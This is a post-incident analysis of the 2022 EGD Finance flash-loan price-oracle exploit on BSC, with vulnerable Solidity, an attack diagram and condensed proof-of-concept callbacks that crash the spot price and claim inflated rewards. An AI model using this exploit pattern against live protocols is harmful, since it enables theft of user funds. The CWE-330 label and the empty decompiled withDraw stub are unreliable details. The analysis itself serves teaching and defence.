# EGD Finance — On-Chain Price Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2022-08-07 |
| **Protocol** | EGD Finance |
| **Chain** | BSC |
| **Loss** | ~$36,044 |
| **Attacker** | [0xee022...](https://bscscan.com/address/0xee0221d76504aec40f63ad7e36855eebf5ea5edd) |
| **Attack Tx** | [0x50da0b1b...](https://bscscan.com/tx/0x50da0b1b6e34bce59769157df769eb45fa11efc7d0e292900d6b0a86ae66a2b3) |
| **Vulnerable Contract** | [0x34bd6dba...](https://bscscan.com/address/0x34bd6dba456bc31c2b3393e499fa10bed32a9370) |
| **Root Cause** | AMM spot price used as oracle in staking reward calculation, making it susceptible to manipulation |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-08/EGD_Finance_exp.sol) |

---
## 1. Vulnerability Overview

EGD Finance distributes staking rewards in EGD tokens, using the current price of the EGD/USDT LP pool on PancakeSwap as an oracle to calculate reward amounts. An attacker artificially depressed the EGD price via a flash loan, then called `claimReward()` to receive far more EGD rewards than normal.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code — AMM spot price used as oracle
function getEGDPrice() public view returns (uint256) {
    // Price calculated from current balances of the PancakeSwap LP pool
    (uint112 reserve0, uint112 reserve1,) = EGD_USDT_LP.getReserves();
    return reserve1 * 1e18 / reserve0; // USDT/EGD = manipulable!
}

function calculateReward(address staker) public view returns (uint256) {
    uint256 egdPrice = getEGDPrice(); // Uses manipulated price
    // Lower price → more EGD reward quantity
    return stakedAmount * rewardRate / egdPrice;
}

// ✅ Fix: Use TWAP oracle or external price feed
function getEGDPrice() public view returns (uint256) {
    return chainlinkOracle.latestAnswer(); // Use Chainlink
    // Or Uniswap V3 TWAP
}
```

### On-Chain Original Code

Source: Bytecode decompilation


**Decompiled_0xb0d35865.sol** — Entry point:
```solidity
// ❌ Root cause: manipulable AMM spot price used as oracle in staking reward calculation
    function withDraw(address arg0, address arg1, uint256 arg2) external {}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[Setup] Stake 100 USDT in EGD Finance
  │              └─ Acquire eligibility to claim rewards
  │
  ├─[1] Flash loan from USDT/WBNB LP (large amount of USDT)
  │
  ├─[2] Additional flash loan from EGD/USDT LP
  │      └─ Borrow large amount of USDT from EGD LP
  │      └─ Trigger EGD price crash (USDT shortage)
  │
  ├─[3] Call claimReward()
  │      ├─ getEGDPrice() = very low price
  │      └─ Receive massive EGD rewards
  │
  ├─[4] Repay flash loans
  │
  └─[5] Sell EGD → USDT to realize profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    // Manipulate price via additional flash loan from EGD LP pool
    EGD_USDT_LPPool.swap(1, EGD_USDT_reserve - 1, address(this), "0000");
}

function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
    // At this point EGD price is extremely low
    // Claim staking rewards from EGD Finance
    // Low price → enormous amount of EGD paid out for the same USDT value
    IEGD_Finance(EGD_Finance).claimReward();

    // Swap acquired EGD to USDT
    address[] memory path = new address[](2);
    path[0] = egd;
    path[1] = usdt;
    pancakeRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
        IERC20(egd).balanceOf(address(this)), 0, path, address(this), block.timestamp
    );

    // Repay flash loan
    IERC20(usdt).transfer(address(EGD_USDT_LPPool), repayAmount);
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **CWE** | CWE-330: Use of Insufficiently Random Values |
| **Vulnerability Type** | Price Oracle Manipulation |
| **Attack Type** | Flash Loan + Spot Price Manipulation |
| **Impact** | Excessive reward distribution, financial loss |
| **CVSS Score** | 8.8 (High) |

## 6. Remediation Recommendations

1. **Use TWAP Oracle**: Time-weighted average price prevents instantaneous manipulation
2. **Integrate Chainlink**: Use a trusted external price feed
3. **Price Deviation Validation**: Halt transactions when a large discrepancy exists between the oracle price and market price
4. **Reward Cap**: Limit the maximum reward claimable in a single transaction

## 7. Lessons Learned

- **Danger of AMM Spot Prices**: The current price on a DEX can be easily manipulated via flash loans. It must not be used as an oracle.
- **Necessity of TWAP**: Price oracles must use time-weighted averages or external feeds.
- **Staking Protocol Vulnerability**: Any protocol that uses on-chain prices in reward calculations is susceptible to similar attacks.